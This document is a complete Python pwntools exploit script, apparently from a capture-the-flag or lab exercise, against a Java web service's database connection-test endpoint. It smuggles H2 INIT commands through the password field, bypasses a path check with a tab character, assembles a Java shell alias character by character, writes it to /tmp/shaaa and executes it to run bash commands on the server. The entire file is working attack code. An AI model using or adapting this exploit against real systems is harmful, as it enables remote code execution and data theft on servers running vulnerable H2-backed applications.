from pwn import *
import random

context.log_level = 'info'

# Configuration
HOST = "localhost"
PORT = 8989
SESSION_ID = "B5892AF2A215B6DCF85102E7B4C4FEE1"

ran_table = "t" + str(random.randint(1000, 9999))

def send_post(path, data):
    """Send POST request using pwntools"""
    # Connect to the server
    conn = remote(HOST, PORT)
    
    # Build POST request body
    body_params = '&'.join([f"{k}={v}" for k, v in data.items()])
    
    # Build HTTP POST request
    request = f"POST {path} HTTP/1.1\r\n"
    request += f"Host: {HOST}:{PORT}\r\n"
    request += "Content-Type: application/x-www-form-urlencoded\r\n"
    request += f"Cookie: JSESSIONID={SESSION_ID}\r\n"
    request += f"Content-Length: {len(body_params)}\r\n"
    request += "Connection: close\r\n"
    request += "\r\n"
    request += body_params
    
    # Send request
    conn.send(request.encode())
    
    # Receive response
    response = conn.recvall(timeout=2).decode('utf-8', errors='ignore')
    conn.close()
    
    return response

# Create table
log.info(f"Creating table {ran_table}")
data = {
    "username": "a",
    "password": f"a;DB_CLOSE_DELAY=-1;INIT=CREATE TABLE {ran_table}(d VARCHAR)",
}
r = send_post("/internal/testConnection\x09", data)
if "faild" not in r:
    log.success(f"Created table {ran_table}")

# Insert first part
log.info("Inserting first part")
data = {
    "username": "a",
    "password": f"a;DB_CLOSE_DELAY=-1;INIT=INSERT INTO {ran_table} VALUES('CREATE ')",
}
r = send_post("/internal/testConnection\x09", data)
if "faild" not in r:
    log.success("Inserted first part")
        
def add(num):
    """Append character to the payload"""
    data = {
        "username": "a",
        "password": f"a;DB_CLOSE_DELAY=-1;INIT=UPDATE {ran_table} SET d = d || CHAR({num})",
    }
    r = send_post("/internal/testConnection\x09", data)
    if "faild" not in r:
        log.info(f"Appended CHAR({num})")
        
payload = """ALIAS SHELL AS $$void shell()throws Exception{ Runtime.getRuntime().exec(new String[]{"/bin/bash","-c","cat /* > /tmp/shaaa"});}$$;CALL SHELL();"""

log.info("Building payload character by character")
for c in payload:
    add(ord(c))
    
# Write to /tmp/shaaa
log.info("Writing to /tmp/shaaa")
data = {
    "username": "a",
    "password": f"a;DB_CLOSE_DELAY=-1;INIT=CALL FILE_WRITE((SELECT * FROM {ran_table} LIMIT 1), '/tmp/shaaa')",
}
r = send_post("/internal/testConnection\x09", data)
if "faild" not in r:
    log.success("Wrote to /tmp/shaaa")
    
# Execute
log.info("Executing /tmp/shaaa")
data = {
    "username": "a",
    "password": f"a;DB_CLOSE_DELAY=-1;INIT=RUNSCRIPT FROM '/tmp/shaaa'",
}
r = send_post("/internal/testConnection\x09", data)
if "faild" not in r:
    log.success("Executed /tmp/shaaa")
    
# Check result
log.info("Checking result from /tmp/shaaa")
data = {
    "username": "a",
    "password": f"a;DB_CLOSE_DELAY=-1;INIT=RUNSCRIPT FROM '/tmp/shaaa'",
}
r = send_post("/internal/testConnection\x09", data)
print("\n" + "="*50)
print("RESPONSE:")
print("="*50)
print(r)